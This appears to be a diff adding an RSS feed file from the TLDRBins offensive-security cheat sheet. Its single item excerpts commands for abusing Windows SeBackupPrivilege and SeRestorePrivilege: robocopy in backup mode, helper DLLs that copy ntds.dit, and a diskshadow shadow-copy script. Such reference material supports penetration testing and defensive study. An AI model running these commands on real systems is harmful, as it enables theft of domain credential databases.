@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>SeRestorePrivilege on TLDRBins</title>
+    <link>https://tldrbins.github.io/@serestoreprivilege/</link>
+    <description>Recent content in SeRestorePrivilege on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@serestoreprivilege/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>SeBackupPrivilege/SeRestorePrivilege</title>
+      <link>https://tldrbins.github.io/sebackupprivilege/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/sebackupprivilege/</guid>
+      <description>Abuse #1: Robocopy # For example robocopy /b &amp;lt;TARGET_DIR_PATH&amp;gt; C:\Windows\Tasks &amp;lt;TARGET_FILE&amp;gt; Abuse #2: Using helper dlls SeBackupPrivilegeUtils.dll&#xA;SeBackupPrivilegeCmdLets.dll&#xA;import-module .\SeBackupPrivilegeCmdLets.dll import-module .\SeBackupPrivilegeUtils.dll Copy-FileSeBackupPrivilege &amp;lt;TARGET_FILE_PATH&amp;gt; C:\ProgramData\&amp;lt;TARGET_FILE&amp;gt; # For example Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\ProgramData\ntds.dit Abuse #3: Diskshadow 1. Create a .dsh file set context persistent nowriters set metadata C:\ProgramData\test.cab set verbose on add volume c: alias test create expose %test% x: # Convert to dos format unix2dos vss.dsh 2. Run vss.dsh # Upload and run diskshadow /s C:\ProgramData\vss.</description>
+    </item>
+  </channel>
+</rss>
